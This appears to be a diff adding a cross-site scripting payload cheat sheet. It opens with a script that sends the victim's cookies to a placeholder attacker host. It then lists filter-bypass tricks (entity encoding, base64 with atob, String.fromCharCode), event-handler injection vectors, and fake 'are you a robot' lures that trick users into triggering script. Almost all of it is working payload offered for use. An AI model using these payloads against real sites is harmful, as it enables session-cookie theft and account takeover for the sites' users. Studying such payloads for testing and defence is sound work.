@@ -1,0 +1,80 @@
+<script>new Image().src="http://attack.machine.ip.addr:PORTNUM/?cookie="+encodeURI(document.cookie);</script> 
+
+
+The go-tos:
+<body/onload=ev&#x61;l(at&#x6f;b(/YWxlcnQoMSk=/.source))>
+<body/onload=ev&#x61;l(String.fromCharCode(97,108,101,114,116,40,49,41))>
+
+
+
+--- Blacklist Bypass Tricks ---
+
+body is unlikely to be filtered
+
+<body onload="alert('body')">
+
+Slashes not spaces
+	<body/onload=alert(1)>
+	
+HTML Encoding of payload characters
+	<body onload="al&#x65;rt(1)">
+	
+Obfuscation with base64 (YWxlcnQoMSk= = alert(1)
+	<body onload="eval(atob('YWxlcnQoMSk='))">
+
+alert('XSS \n\nLocation:\n' + document.location + '\n\nCookie:\n' + document.cookie)
+YWxlcnQoJ1hTUyBcblxuTG9jYXRpb246XG4nICsgZG9jdW1lbnQubG9jYXRpb24gKyAnXG5cbkNvb2tpZTpcbicgKyBkb2N1bWVudC5jb29raWUp
+
+
+Obfuscation with String.fromCharCode
+
+	<body onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
+
+Strings from .source
+	<body onload=alert(/xss/.source)>
+
+<body/onload=ev&#x61;l(at&#x6f;b(/YWxlcnQoMSk=/.source))>
+
+
+The go-tos:
+<body/onload=ev&#x61;l(at&#x6f;b(/YWxlcnQoMSk=/.source))>
+<body/onload=ev&#x61;l(String.fromCharCode(97,108,101,114,116,40,49,41))>
+
+
+<body onload="alert('load')">
+<body onPageShow="alert('pageshow')">
+
+
+Don't use both of these at the same time
+<body onblur="alert('onblur')">
+<body onfocus="alert('onfocus')">
+
+<marquee onfinish=alert(1) loop=1 width=0></marquee>
+
+<img onerror="alert('img')" src=x width=0 height=0></img>
+<image onerror="alert('image')" src=x width=0 height=0></image>
+<audio onerror="alert('audio')" src=x width=0 height=0></audio>
+<video onerror="alert('video')" src=x width=0 height=0></video>
+<object onerror="alert('object')" src=x></object>
+
+
+
+User interaction is required below this line
+
+<body onMouseEnter="alert('mousenter')">
+<body onMouseMove="alert('MouseMove')">
+<body onMouseOver="alert('MouseOver')">
+
+
+TinyMCE seems to require select and onchange
+Deploys a bit of social engineering
+
+<select onchange="alert(1)"><option>Are you a robot?</option><option>Yes, I am a robot</option><option>No, I am not a robot</select>
+	
+Submit a form?
+<form id="abc" />
+<button form="abc" formaction="javascript:alert(1)">Click here if you are not a robot
+</button></form>
+
+	
+	
